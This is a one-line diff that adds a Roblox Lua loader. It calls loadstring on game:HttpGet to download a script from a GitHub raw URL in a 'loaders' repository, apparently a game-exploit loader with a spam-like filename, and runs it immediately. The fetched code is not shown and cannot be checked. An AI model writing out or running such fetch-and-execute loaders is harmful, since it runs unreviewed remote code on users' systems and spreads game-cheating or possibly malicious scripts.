@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/7-days-cat-sitting-spam6-vhcs1hljhwgdjx.lua"))()
